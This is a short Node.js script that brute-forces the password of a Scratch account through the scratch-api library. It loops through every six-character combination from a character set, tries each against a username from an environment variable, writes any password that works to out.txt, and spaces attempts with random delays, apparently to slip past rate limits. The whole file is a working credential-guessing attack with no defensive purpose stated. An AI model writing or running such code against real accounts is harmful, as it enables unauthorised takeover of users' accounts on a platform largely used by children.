const Scratch = require('scratch-api')
const fs = require('fs')
const { time } = require('console')
require('dotenv').config()

const chars = ['etainoshrdlucmfzwygpbvx0123456789', 'etainoshrdlucmfzwygpbvkjxqETAINOSHRDLUCMFZWYGPBVKJXQ0123456789']
const common = [
  'password',
  'password1',
  'password123',
  'scratch',
]

function round(n, to) {
  return Math.round(n / ((to) ? to : 1)) * ((to) ? to : 1)
}

function enter(username, password) {
  Scratch.UserSession.create(username, password, (err, user) => {
    if (err) return console.log(err)
    if (user) fs.writeFileSync('out.txt', password)
  })
}

function loop(n, spread, depth, options, callback) {
  if (n < spread ** depth) {
    console.log(n)
    const a = []
    for (let i = 0; i < depth; i++) {
      a[i] = options[Math.floor((n * spread * spread ** i) / (spread ** depth)) % spread]
    }
    callback(a.join(''))
    n++
    const delay = (Math.random() + 1) * 1000
    console.log(`${round(delay)}ms`)
    setTimeout(() => loop(n, spread, depth, options, callback), delay)
  } else {
    console.log(`Ended at ${i}!`)
  }
}

loop(0, chars[0].length, 6, chars[0], (x) => enter(process.env.usr, x))

// enter(process.env.usr, process.env.pwd)